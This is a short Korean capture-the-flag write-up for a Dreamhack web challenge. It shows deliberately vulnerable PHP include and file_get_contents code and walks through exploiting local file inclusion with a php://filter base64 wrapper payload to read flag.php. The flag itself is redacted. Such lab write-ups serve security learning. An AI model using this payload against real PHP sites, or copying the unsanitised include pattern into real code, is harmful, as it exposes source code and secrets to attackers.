created: 2026-01-18 00:09
category: #web
link: https://dreamhack.io/wargame/challenges/46

# Write-up
```php
// index.php
<?php
    include $_GET['page']?$_GET['page'].'.php':'main.php';
?>
```

```php
// view.php
<h2>View</h2>
<pre><?php
    $file = $_GET['file']?$_GET['file']:'';
    if(preg_match('/flag|:/i', $file)){
        exit('Permission denied');
    }
    echo file_get_contents($file);
?>
</pre>
```
- 우선 위 두 코드처럼 **LFI 취약점**이 존재하는 파일이 2가지 존재함.
- php의 `include`와 `file_get_contents` 모두 LFI 취약점을 공격하는 데 쓸 수 있는 것으로 알고있음. 
- 그러나 `view.php`에서는 `preg_match` 함수를 통해 'flag'와 ':' 문자열을 검열하는 것으로 보임.
- 따라서 `index.php`를 공격 해야겠다고 판단함. 

먼저 `/?page=/var/www/uploads/flag`처럼 파라미터를 주었음. 그러면 php 서버상에서 `include /var/www/uploads/flag.php` 파일을 읽어서 플래그가 출력될 것으로 예상함.

![[Pasted image 20260118004008.png|600]]
- 그러나 실제 결과를 확인해보니 "can you see $flag?"라는 문자열만 출력되고 **실제 플래그는 보이지 않았음.**
- 가려져서 안보이나 했지만, HTML 코드를 확인해보아도 플래그는 없었음. 

약간의 서칭을 하다보니 **php wrapper** 키워드를 알게 됨. 
- `php://filter/convert.base64-encode/resource=[파일명]` 이러한 구조로 php wrapper를 사용하여 원본 파일을 볼 수 있음.

최종적으로
`http://host8.dreamhack.games:13067/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag`
위와 같이 파라미터를 전송하여 `flag.php`를 base64 인코딩한 상태로 출력할 수 있었음
- 이를 외부 도구를 사용하여 디코딩했고 그 결과는 다음과 같음
```php
<?php
	$flag = 'DH{가림막}';
?>
can you see $flag?
```

# Reference
- https://gongv-log.tistory.com/76
- https://comncme.tistory.com/entry/PHP-include-%EB%AC%B8
- https://www.php.net/manual/en/wrappers.php.php
- https://codingeverybody.kr/php-preg_match-%ED%95%A8%EC%88%98/
- https://www.base64decode.org/